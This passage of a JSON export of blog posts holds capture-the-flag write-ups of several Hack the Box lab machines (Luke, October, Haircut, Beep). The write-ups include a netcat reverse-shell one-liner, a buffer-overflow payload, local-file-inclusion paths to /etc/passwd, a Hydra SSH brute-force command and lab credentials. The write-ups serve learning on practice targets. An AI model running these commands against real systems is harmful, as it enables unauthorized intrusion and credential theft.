found&nbsp;</p>\n\n<p><strong>/bin/fuckin</strong></p>\n\n<p>then to run the shell sudo /bin/fuckin bash</p>\n\n<p>Voila Root =)</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_017.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_017.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Completed!!</p>\n\n<p>&nbsp;</p>\n\n<p>Many thanks!</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.10",
      "title": "Tentan - Completed   [Hack the box] - ",
      "published": {
        "seconds": 1556642499,
        "nanoseconds": 897000000
      }
    },
    "IS7N1eugeplQIi6qdEuU": {
      "content": "<p>This is so far one of the most difficult boxes I made so far I googled in first place on tokens becuase I want to get even more understanding how you can find lack of security for different tokens.</p>\n\n<p>&nbsp;</p>\n\n<p>I started of with a nmap scan</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173227.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173227.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>then I did a gobuster scan meanwhile</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173333.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173333.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>when I was looking on one of the files:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162315.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162315.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I found some details but I couldnt make use of them anywhere.</p>\n\n<p>&nbsp;</p>\n\n<p>I found few different potals to login to:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173549.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173549.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>and</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173630.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-173630.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>no success at all so I decided to do some curl commands to see if I could get a good response:</p>\n\n<p>&nbsp;</p>\n\n<p>curl -XPOST http://luke.htb:3000/login -d &#39;username=admin&amp;password=Zk6heYCyv6ZE9Xcg&#39;; echo</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162730.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162730.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>finally I got a bearer token.</p>\n\n<p>the next step was to find out which kind of token I have got, since this is the whole token:</p>\n\n<p>&nbsp;</p>\n\n<p>{&quot;success&quot;:true,&quot;message&quot;:&quot;Authentication successful!&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc5MTg4NzUyLCJleHAiOjE1NzkyNzUxNTJ9.Wnh1P6SM0LFWpfaifZl0z74uVyOHWnCZErEW4Ey-VPQ&quot;}<br />\n<br />\nI learned the token is divided in 3 pieces</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>STEP #1<br />\n<br />\nfirst part explains the information about the token such algorithm for signing<br />\n<br />\n<br />\n<br />\n<br />\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<br />\n<br />\n<br />\nto find out which token decode it as base64<br />\n<br />\n<br />\necho -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 | base64 --decode</p>\n\n<p>&nbsp;</p>\n\n<p>it is a JWT token --&gt;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162859.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162859.png\" style=\"height:275px; width:500px\" /></a><br />\n<br />\n<br />\nSTEP #2<br />\n<br />\nsecond part is the data<br />\n<br />\neyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc5MTg4NzUyLCJleHAiOjE1NzkyNzUxNTJ9<br />\n<br />\necho -n eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc5MTg4NzUyLCJleHAiOjE1NzkyNzUxNTJ9 | base64 -d</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162952.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-162952.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p><br />\n{&quot;username&quot;:&quot;admin&quot;,&quot;iat&quot;:1579188752,&quot;exp&quot;:1579275152}xsisec@d0m:~$<br />\n<br />\n<br />\n<br />\n<br />\n<br />\nSTEP #3<br />\n<br />\nthird part is the signature<br />\n<br />\nWnh1P6SM0LFWpfaifZl0z74uVyOHWnCZErEW4Ey-VPQ<br />\n<br />\n&nbsp;</p>\n\n<p>next step was to elobate if I could make a successfully request.</p>\n\n<p>&nbsp;</p>\n\n<p>this is what I came up with.</p>\n\n<p>&nbsp;</p>\n\n<p>curl http://luke.htb:3000/ -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc5MTg4NzUyLCJleHAiOjE1NzkyNzUxNTJ9.Wnh1P6SM0LFWpfaifZl0z74uVyOHWnCZErEW4Ey-VPQ&#39;; echo</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-164236.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-164236.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>since I got&nbsp; a 200 response, next step was to enumerate the possibility users:</p>\n\n<p>also I found a good tool jq that could format the outcome very well.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-164443.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-164443.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Next thing I also learned and hopefulyl gonna make much more use of later on in other boxes is how I can let my browser listen burp-suite where I set-up a custom header as role for a certain session which works as a header for the webpage I am navigates around.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-165359.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-165359.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>here is the session I set-up</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20200116-170225.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20200116-170225.png\" style=\"height:336px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>next step was to abuse the web-api where I was authenticated to also enumerate possible users I found in steps above:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-170619.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-170619.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Since I could visit few URLS, where I was authenticated to I found following file very interesting:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-171112.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-171112.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I was playing around with admin,administrator and root as username to the agenti webportal then I could log-on.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-171220.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-171220.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>next step was to set-up a reverse shell by use:</p>\n\n<p>&nbsp;</p>\n\n<p>mkfifo /tmp/f</p>\n\n<p>cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.12 1337 &gt; /tmp/f</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-172533.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-172533.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>voila a shell</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-172542.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-172542.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>since I had so limited access to not dir but &quot;ls&quot; was working I didnt wanted to spend even more time on try to figure out which possible scripts I could run</p>\n\n<p>I tried with eg like usual &quot;python -c &#39;import pty;spawn(&quot;/bin/bash&quot;)&#39; etc.</p>\n\n<p>&nbsp;</p>\n\n<p>but nothing was available so I was lazy just to get both the user flag and root flag.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-172713.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200116-172713.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Thank you!</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.137",
      "title": "Luke User and Root flag [Hack the box] - [Blog] ",
      "published": {
        "seconds": 1579193645,
        "nanoseconds": 138000000
      },
      
      "author": "XsiSec none",
      "levels": [
        "Hard"
      ],
      "image": null,
      "os": [
        "Linux"
      ]
    },
    "LsocYboTXQjAqoDwACW0": {
      "title": "October - Part 2 [Hack the box] ",
      "published": {
        "seconds": 1568730378,
        "nanoseconds": 1000000
      },
      
      "author": "XsiSec none",
      "levels": [
        "Hard"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>Finally solved my first box with a LOTS HELP though I think I understood the procedure behind the overflow.</p>\n\n<p>Since I already got the user-flag I run following command:</p>\n\n<p>&nbsp;</p>\n\n<p>/ -perm -4000 2&gt;/dev/null</p>\n\n<p>&nbsp;</p>\n\n<p>This is to see SUID(Set owner User ID up on execution) is a special type of file permissions given to a file.</p>\n\n<p>Normally in Linux/Unix when a program runs, it inherits access permisions from the logged in user. SUID is defined as giving temporary permisions to a user to run a program/file with the permissions of the file owner rather that the user who runs it.&nbsp;</p>\n\n<p><strong>In Simple words users will get file owner&#39;s permissions as well as owner UID and GID when executing a file/program/command.</strong></p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190917-152310.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190917-152310.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>From the picture we get a HINT /usr/local/bin/ovrflw</p>\n\n<p>As usual I imported the shell by use: python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</p>\n\n<p>I am very new to buffer-overflow but I practised this for a time ago and I remember the basics, the purpose is really to overload segments for a process.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190917-154542.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190917-154542.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>this is my outcome when I run gdb against the program:</p>\n\n<p>while true; do /usr/local/bin/ovrflw $(python -c &#39;print &quot;A&quot; * 112 + &quot;\\x10\\xd3\\x5b\\xb7\\x60\\x02\\x5b\\xb7\\xac\\xfb\\x6d\\xb7&quot;&#39;);done&nbsp;<br />\n6bcb9cff749c9318d2a6e71bbcf30318</p>\n\n<p>&nbsp;</p>\n\n<p>Voila!</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190917-155613.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190917-155613.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>finally made it I will definetly analyse really what I have done since I want to get an wider understanding of the procedure.</p>\n\n<p><br />\nEnjoy!</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.16"
    },
    "ODr01y3HlkO1ZQ1gfj4u": {
      
      "author": "XsiSec none",
      "levels": [
        "Easy"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>This is one of the simpliest boxes so far though I had an idea how I would like to manage the box though I didnt remeber all the way to do it.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191016-220007.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191016-220007.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>this is how the box was looking&nbsp;</p>\n\n<p>the source code didn&#39;t contain much at all..</p>\n\n<p>&nbsp;</p>\n\n<p>I did some dirbuster search with:</p>\n\n<p>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>\n\n<p>&nbsp;</p>\n\n<p>I found following urls:</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191016-220229.png\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191016-220229.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I tried different curl commands i know how to use it but only on basic-level,</p>\n\n<p>In this place I know I wanted to try to see if the site was vulnerable against command execution</p>\n\n<p>so I launched</p>\n\n<p>python -m SimpleHTTPServer</p>\n\n<p>&nbsp;</p>\n\n<p>after i created a simple shell:</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191014-210117.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191014-210117.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Voila:</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191016-212810.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191016-212810.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I was using the reapeterr through burp to try different ls commands</p>\n\n<p>I could list current directory:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191014-210218.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191014-210218.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>Regardless I found following command satisfy my needs,</p>\n\n<p>Then I tried to import tab-autocompletion,</p>\n\n<p>&nbsp;</p>\n\n<p>though the server was not using regular python(2)</p>\n\n<p>so I had to use python3</p>\n\n<p>and run following command:</p>\n\n<p>python3 &#39;import pty;pty.spawn(&quot;bin/bash&quot;)&#39;</p>\n\n<p>then just navigate to the flag easy:</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191014-211347.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191014-211347.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.24",
      "title": "Haircut Part 1 [Hack the box] - [Blog] ",
      "published": {
        "seconds": 1571256557,
        "nanoseconds": 558000000
      }
    },
    "OkRG8X9f5HcS3B5GqS44": {
      "title": "Beep  - Completed [Hack the box]  - [Blog] ",
      "published": {
        "seconds": 1555705001,
        "nanoseconds": 559000000
      },
      
      "author": "XsiSec",
      "levels": [
        "Medium"
      ],
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2FKali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_014.png?alt=media&token=0f614f68-3041-4389-ab2b-cb4011b6fc31",
      "os": [
        "Linux"
      ],
      "content": "<p>this is a very tricky user flag,</p>\n\n<p>I was looking on few tutorials and in each of them people was finding regardless enumeration tool nested&nbsp; folder xxx/vtigercrm/</p>\n\n<p>&nbsp;</p>\n\n<p>I made several atempts with:</p>\n\n<p>use auxiliary/scanner/http/dir_scanner &nbsp;&nbsp;<br />\nmsf auxiliary(dir_scanner) &gt;set dictionary /usr/share/wordlists/dirb/common.txt<br />\nmsf auxiliary(dir_scanner) &gt;set rhosts 192.168.1.5<br />\nmsf auxiliary(dir_scanner) &gt; set path 10.10.10.7<br />\nmsf auxiliary(dir_scanner) &gt;exploit</p>\n\n<p>(no success)</p>\n\n<p>./dirsearch.py -u beep.htb -e php -f -x 400,403,404&nbsp;(no success)<br />\ndirbuster 500 threads + medium-23&nbsp; (no success)</p>\n\n<p>That was very annoying when I tried since other people succeded anyway I wanted to continue=)</p>\n\n<p>I searched for elastix as exploit within searchsploit</p>\n\n<p>I found this entries:</p>\n\n<p>&nbsp;Exploit Title &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp;Path<br />\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | (/usr/share/exploitdb/)<br />\n------------------------------------------------------------------------------------------------ ----------------------------------------<br />\nElastix - &#39;page&#39; Cross-Site Scripting &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | exploits/php/webapps/38078.py<br />\nElastix - Multiple Cross-Site Scripting Vulnerabilities &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | exploits/php/webapps/38544.txt<br />\nElastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | exploits/php/webapps/34942.txt<br />\nElastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| exploits/php/webapps/37637.pl<br />\nElastix 2.x - Blind SQL Injection &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | exploits/php/webapps/36305.txt<br />\nElastix &lt; 2.5 - PHP Code Injection &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| exploits/php/webapps/38091.php<br />\nFreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| exploits/php/webapps/18650.py<br />\n------------------------------------------------------------------------------------------------ -----------------I found this interesting:</p>\n\n<p>Elastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| exploits/php/webapps/37637.pl<br />\n&nbsp;</p>\n\n<p>searchsploit -x exploits/php/webapps/37637.pl</p>\n\n<p>There as a little thing in the code I elaborated with:</p>\n\n<p><br />\nhttps://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</p>\n\n<p>that became:</p>\n\n<p>https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00</p>\n\n<p>I cleaned up the content to find out possible users with vim:</p>\n\n<p>g:/nologin/d (remove all occurances that have that within)</p>\n\n<p>root:x:0:0:root:/root:/bin/bash<br />\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br />\ncyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash<br />\nasterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash<br />\nspamfilter:x:500:500::/home/spamfilter:/bin/bash<br />\nfanis:x:501:501::/home/fanis:/bin/bash</p>\n\n<p>&nbsp;</p>\n\n<p>view-source:https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action&nbsp;</p>\n\n<p>became:</p>\n\n<p>asterisk<br />\nasteriskuser<br />\namp109<br />\nasterisk<br />\nadmin<br />\namp111<br />\nadmin<br />\njEhdIekWmdjE</p>\n\n<p>I didnt know if there as any limitation of how many ssh atempts meanwhile trying to bruteforce the login with Hydra</p>\n\n<p>hydra -L users.txt -P passwords.txt ssh://beep.htb</p>\n\n<p>&nbsp;</p>\n\n<p>so I tried manually to connect:</p>\n\n<p>ssh root@beep.htb</p>\n\n<p>voila =) it worked.</p>\n\n<p>&nbsp;</p>\n\n<p>then just navigate /home/fanis/user.txt<br />\naeff3def0c765c2677b94715cffa73ac</p>\n\n<p>also since I already was root I could navigate to /root/</p>\n\n<p>[root@beep ~]# cat root.txt&nbsp;<br />\nd88e006123842106982acce0aaf453f0<br />\n[root@beep ~]#&nbsp;<br />\n&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><br />\n&nbsp;</p>\n",
      "ipadress": "10.10.10.7"
    },
    "Our8iysKFGr4y2LWIV2F": {
      "levels": [
        "Easy"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
